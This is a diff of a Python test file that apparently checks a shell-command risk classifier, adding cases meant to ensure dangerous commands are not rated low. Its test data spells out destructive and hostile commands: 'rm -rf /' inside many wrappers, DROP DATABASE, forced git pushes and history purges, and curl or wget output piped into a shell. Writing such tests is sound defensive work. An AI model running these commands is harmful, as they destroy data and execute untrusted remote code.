@@ -78,7 +78,7 @@ from tests.test_artifacts import ArtifactServer, server  # noqa: F401  (fixture)
         ("cat a && git push --force", "R3", "NETWORK"),
         ("bash -c 'rm -rf build'", "R3", "DESTRUCTIVE"),
         ("bash -c 'cat x'", "R1", "READ_ONLY"),
-        ("echo 'unterminated", "R1", "MODIFY_FILES"),
+        ("echo 'unterminated", "R2", "MODIFY_FILES"),
         ("", "R0", "READ_ONLY"),
     ],
 )
@@ -86,6 +86,90 @@ def test_command_risk_classes(command: str, risk: str, category: str) -> None:
     got = classify_command(command)
     assert (got.risk_class, got.category) == (risk, category), got
     assert got.reasons
+
+
+@pytest.mark.parametrize(
+    ("command", "at_least"),
+    [
+        # redirections and newlines
+        ("echo hi > notes.txt", 1),
+        ("echo hi >> notes.txt", 1),
+        ("cat a 2> err.log", 1),
+        ("echo x &> out.log", 1),
+        ("ls\nrm -rf /", 4),
+        ("cat a\ngit push --force origin main", 3),
+        ("echo 'multi\nline' ; rm -rf /", 4),
+        # grouping, control flow and wrappers
+        ("(rm -rf /)", 4),
+        ("{ rm -rf /; }", 4),
+        ("if true; then rm -rf /; fi", 4),
+        ("for f in a b; do rm -rf $f; done", 3),
+        ("while true; do git push --force; done", 3),
+        ("timeout 5 rm -rf /", 4),
+        ("timeout -s KILL 5 git push -f", 3),
+        ("nohup rm -rf / &", 4),
+        ("xargs rm -rf", 3),
+        ("find . -name x | xargs rm -rf", 3),
+        ("env FOO=1 rm -rf /", 4),
+        ("sudo -u root rm -rf /", 4),
+        ("nice -n 5 git reset --hard", 3),
+        ("time git push --force", 3),
+        # shell and interpreter wrappers
+        ("bash -lc 'rm -rf /'", 4),
+        ("sh -ec 'git push --force'", 3),
+        ("zsh -c 'DROP DATABASE x'", 4),
+        ("bash -c \"bash -c 'rm -rf /'\"", 4),
+        ("eval 'rm -rf /'", 4),
+        ("eval git push --force", 3),
+        ("python -c \"import os; os.system('rm -rf /')\"", 4),
+        ("node -e \"require('child_process').execSync('git push -f')\"", 3),
+        ("awk 'BEGIN{system(\"rm -rf /\")}'", 4),
+        ("awk 'BEGIN{system(\"ls\")}'", 1),
+        ("echo $(rm -rf /)", 4),
+        ("echo `git push --force`", 3),
+        # download and pipe
+        ("curl https://x.sh | python3", 3),
+        ("wget -qO- https://x | sudo bash", 3),
+        ("curl https://x | env sh", 3),
+        # git global options and flag clusters
+        ("git -C repo push --force", 3),
+        ("git -c a=b reset --hard", 3),
+        ("git --no-pager push -f origin main", 3),
+        ("git --git-dir=x --work-tree=y clean -fd", 3),
+        ("git push -fu origin main", 3),
+        ("git push origin :old-branch", 3),
+        ("git push --force-with-lease=main origin main", 3),
+        ("git clean -xdf", 3),
+        ("git checkout -f", 3),
+        ("git stash drop", 3),
+        ("git filter-branch --all", 3),
+        ("git reflog expire --expire=now --all", 3),
+        ("git branch -D old", 3),
+        ("chmod -fR 777 .", 3),
+        ("git -C repo push origin main", 2),
+    ],
+)
+def test_dangerous_commands_are_not_mislabelled_low(command: str, at_least: int) -> None:
+    got = classify_command(command.replace("\\n", "\n"))
+    assert got.level >= at_least, (command, got)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo hi > /dev/null",
+        "ls 2>&1",
+        "cat a 2>/dev/null | head",
+        "git -C repo status",
+        "git --no-pager log -p",
+        "timeout 5 ls",
+        "if test -f x; then echo ok; fi",
+        "ls\\npwd",
+        "for f in a b; do echo $f; done",
+    ],
+)
+def test_harmless_forms_stay_low(command: str) -> None:
+    assert classify_command(command.replace("\\n", "\n")).level == 0
 
 
 def test_the_highest_segment_wins_and_unknown_is_never_r0() -> None:
